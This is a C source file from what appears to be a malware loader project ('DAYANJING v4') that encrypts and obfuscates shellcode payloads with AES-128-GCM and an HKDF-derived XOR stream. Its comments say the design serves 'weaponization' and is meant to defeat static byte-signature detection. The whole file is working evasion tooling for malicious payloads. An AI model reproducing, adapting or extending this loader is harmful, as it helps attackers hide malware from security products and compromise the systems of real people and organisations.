/*
 * DAYANJING v4 — 17_loader/src/shellcode.c
 *
 * shellcode 编解码：AES-128-GCM（AEAD）+ 基于种子派生的 XOR 流混淆。
 *
 * 为什么两层：
 *   - GCM 提供机密性 + 完整性。载荷被篡改必须被检出，而不是静默解出错误内容。
 *     （早期版本用 CBC：CBC 无完整性保护，篡改密文在填充恰好合法时
 *       甚至不报错，只会静默产生错误明文——对武器化不可接受，故换为 AEAD。）
 *   - 外层 XOR 流由 (seed, iv) 共同派生，同一份明文每次编码结果都不同，
 *     消除稳定字节序列，避免基于固定字节的静态规则命中。
 *     注意：XOR 只改变可观测字节，不承担安全性——安全性完全由 GCM 承担。
 *
 * 载荷格式（ver = 2）：
 *   [ hdr 24B ] [ tag 16B ] [ ct nB ]      后 16+n 字节整体再做 XOR 混淆
 *   hdr = magic(4) | ver(1) | flags(1) | rsv(2) | orig_len(4,LE) | iv(12)
 *   AAD = hdr 的前 12 字节（magic/ver/flags/rsv/orig_len）
 *
 * AES/GCM 复用 00_crypto 自研实现（无 OpenSSL）。
 */

#include "loader.h"
#include "crypto_gcm.h"
#include "crypto_hash.h"

#include <string.h>

static const uint8_t SC_MAGIC[4] = { 'D', 'L', 'S', 'C' };
#define SC_VER 2u

/* AAD 覆盖范围：magic..orig_len，不含 iv */
#define SC_AAD_LEN (SC_HDR_LEN - SC_IV_LEN)

size_t sc_encode_size(size_t in_len)
{
    if (in_len > (size_t)0xFFFFFFFFu) return 0;
    return SC_HDR_LEN + SC_TAG_LEN + in_len;   /* GCM 不填充：ct 长度 == pt 长度 */
}

/* 密钥：HKDF(ikm=seed, info="dayanjing:sc:key:v1") -> 16 字节 */
static int sc_derive_key(const uint8_t *seed, size_t seed_len,
                         uint8_t key[SC_KEY_LEN])
{
    static const uint8_t info_key[19] = "dayanjing:sc:key:v1";
    if (hkdf(NULL, 0, seed, seed_len, info_key, sizeof(info_key), key, SC_KEY_LEN) != HASH_OK)
        return LD_ERR_ARG;
    return LD_OK;
}

/*
 * XOR 流分块：每块用不同 info（含块序号）派生。
 *
 * 这里不能"每次都派生流的前 N 字节"——HKDF-Expand 是确定性的，
 * 那样每一块都会得到同一个前缀，导致长载荷后半段被同一段密钥流反复覆盖，
 * 等效于周期性的弱混淆。块序号进 info 才能保证整条流不重复。
 */
static int sc_derive_xor(const uint8_t *seed, size_t seed_len,
                         const uint8_t iv[SC_IV_LEN],
                         uint32_t blk, uint8_t *out, size_t len)
{
    uint8_t info[23];
    memcpy(info, "dayanjing:sc:xor:v1", 19);
    ld_wr32(info + 19, blk);
    if (hkdf(iv, SC_IV_LEN, seed, seed_len, info, sizeof(info), out, len) != HASH_OK)
        return LD_ERR_ARG;
    return LD_OK;
}

int sc_encode(const uint8_t *in, size_t in_len,
              const uint8_t *seed, size_t seed_len,
              const uint8_t iv[SC_IV_LEN],
              uint8_t *out, size_t *out_len)
{
    size_t need, i;
    uint8_t key[SC_KEY_LEN];
    uint8_t tagbuf[SC_TAG_LEN];
    uint8_t *tag;
    uint8_t *body;
    int r;

    if (!out || !out_len || !iv) return LD_ERR_ARG;
    if (!seed || seed_len == 0) return LD_ERR_ARG;
    if (in_len > 0 && !in) return LD_ERR_ARG;

    need = sc_encode_size(in_len);
    if (need == 0) return LD_ERR_ARG;
    if (*out_len < need) { *out_len = need; return LD_ERR_NOSPACE; }

    memset(out, 0, need);
    memcpy(out, SC_MAGIC, 4);
    out[4] = SC_VER;
    out[5] = 0;                 /* flags */
    out[6] = 0; out[7] = 0;     /* reserved */
    ld_wr32(out + 8, (uint32_t)in_len);
    memcpy(out + 12, iv, SC_IV_LEN);

    r = sc_derive_key(seed, seed_len, key);
    if (r != LD_OK) return r;

    tag  = out + SC_HDR_LEN;
    body = out + SC_HDR_LEN + SC_TAG_LEN;

    /* AAD 绑定头部（magic/ver/flags/rsv/orig_len），篡改 orig_len 也会被检出 */
    if (gcm_seal(key, iv, out, SC_AAD_LEN, in, in_len, body, tagbuf) != GCM_OK)
        return LD_ERR_ARG;
    memcpy(tag, tagbuf, SC_TAG_LEN);

    {
        /* XOR 覆盖 tag+ct 整体；栈上分块，避免为长载荷做一次大分配 */
        uint8_t ks[256];
        size_t total = SC_TAG_LEN + in_len;
        size_t off = 0;
        uint32_t blk = 0;

        while (off < total) {
            size_t chunk = total - off < sizeof(ks) ? total - off : sizeof(ks);
            int rr = sc_derive_xor(seed, seed_len, iv, blk, ks, chunk);
            if (rr != LD_OK) return rr;
            for (i = 0; i < chunk; i++) tag[off + i] ^= ks[i];
            off += chunk;
            blk++;
        }
    }

    *out_len = need;
    return LD_OK;
}

int sc_decode(const uint8_t *blob, size_t blob_len,
              const uint8_t *seed, size_t seed_len,
              uint8_t *out, size_t *out_len)
{
    uint8_t iv[SC_IV_LEN];
    uint8_t key[SC_KEY_LEN];
    uint8_t tagbuf[SC_TAG_LEN];
    uint32_t orig;
    size_t n, cap, i;
    int r;

    if (!blob || !out || !out_len) return LD_ERR_ARG;
    if (!seed || seed_len == 0) return LD_ERR_ARG;
    if (blob_len < SC_HDR_LEN + SC_TAG_LEN) return LD_ERR_TRUNC;

    /* SEC-CMP:PUBLIC: 格式魔数校验。SC_MAGIC 是容器格式标记，明文出现在载荷头部。 */
    if (memcmp(blob, SC_MAGIC, 4) != 0) return LD_ERR_FORMAT;
    if (blob[4] != SC_VER) return LD_ERR_FORMAT;

    orig = ld_rd32(blob + 8);
    memcpy(iv, blob + 12, SC_IV_LEN);

    n = blob_len - SC_HDR_LEN - SC_TAG_LEN;
    if (orig != n) return LD_ERR_FORMAT;   /* 头部声明长度与实际密文长度不符 */

    cap = *out_len;
    if (cap < orig) { *out_len = orig; return LD_ERR_NOSPACE; }

    r = sc_derive_key(seed, seed_len, key);
    if (r != LD_OK) return r;

    /* 逆 XOR：tag 收在栈上，ct 直接落到 out（GCM 的 GCTR 支持就地） */
    {
        uint8_t ks[256];
        size_t total = SC_TAG_LEN + n;
        size_t off = 0;
        uint32_t blk = 0;
        const uint8_t *src = blob + SC_HDR_LEN;

        while (off < total) {
            size_t chunk = total - off < sizeof(ks) ? total - off : sizeof(ks);
            int rr = sc_derive_xor(seed, seed_len, iv, blk, ks, chunk);
            if (rr != LD_OK) return rr;
            for (i = 0; i < chunk; i++) {
                uint8_t v = (uint8_t)(src[off + i] ^ ks[i]);
                size_t pos = off + i;
                if (pos < SC_TAG_LEN) tagbuf[pos] = v;
                else                  out[pos - SC_TAG_LEN] = v;
            }
            off += chunk;
            blk++;
        }
    }

    r = gcm_open(key, iv, blob, SC_AAD_LEN, out, n, tagbuf, out);
    if (r == GCM_ERR_AUTH) return LD_ERR_AUTH;
    if (r != GCM_OK) return LD_ERR_ARG;

    *out_len = orig;
    return LD_OK;
}
